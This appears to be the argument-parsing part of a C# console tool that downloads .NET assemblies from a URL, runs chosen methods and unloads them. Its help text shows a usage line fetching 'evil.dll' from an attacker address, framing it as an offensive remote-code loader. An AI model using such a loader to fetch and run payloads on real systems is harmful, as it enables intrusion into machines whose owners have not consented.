using System;
using System.Linq;

namespace Domains
{
    public class Utils
    {
        internal static Manager m = new Manager();
        public static bool parseArguments(string[] args)
        {
            if (args.Length > 0)
            {
                getValues(args, out var url, out var method, out var assembly);


                if (args[0] == "-h")
                    args[0] = "help";

                switch (args[0])
                {
                    case "load":
                        if (url == "")
                            Console.WriteLine("Invalid url.");
                        else
                            m.loadAssembly(url, method, assembly);

                        break;
                    case "unload":
                        if (assembly == "")
                            Console.WriteLine("Invalid assembly name.");
                        else
                        {
                            m.unloadAssembly(assembly);
                        }
                        break;
                    case "execute":
                        if(method == "" || assembly == "")
                        {
                            Console.WriteLine("Invalid arguments.");
                        }
                        else
                        {
                            Console.Write("Insert the arguments to pass to the function: ");
                            var arguments = Console.ReadLine();
                            m.executeMethod(assembly, method, arguments);
                        }
                        break;
                    case "list":
                        if (assembly == "")
                            m.listLoadedAssemblies();
                        else
                            m.listMethodsAvailable(assembly);
                        break;
                    case "exit":
                        return true;
                    case "help":
                        printHelp();
                        break;
                    default:
                        Console.WriteLine("Unknown command.");
                        break;
                }
            }
            return false;
        }

        public static void getValues(string[] args, out string url,  out string method, out string unloadAssembly)
        {
            url = "";
            unloadAssembly = "";
            method = "";
           
            var skip = args.Skip(1).ToArray();

            for (int i = 0; i < skip.Length - 1; i += 2)
            {
                switch (skip[i])
                {
                    case "-u":
                        url = skip[i + 1];
                        break;
                    case "-a":
                        unloadAssembly = skip[i + 1];
                        break;
                    case "-m":
                        method = skip[i + 1];
                        break;
                    default:
                        Console.WriteLine("Unknown option: " + skip[i]);
                        break;
                }
            }
            
        }

        public static void printHelp()
        {
            var help = @"
usage:  Domains.exe load -u https://attackerIPaddress/evil.dll 
        Domains.exe execute -a assemblyName -m method
        Domains.exe unload -a assemblyName
        Domains.exe list
        Domains.exe help

  options:
    -u  URL where the assembly should be downloaded from.
    -a  Select assembly by name.
    -m  Method to execute.
    -h  Show help menu.
";
            Console.WriteLine(help);
        }
    }
}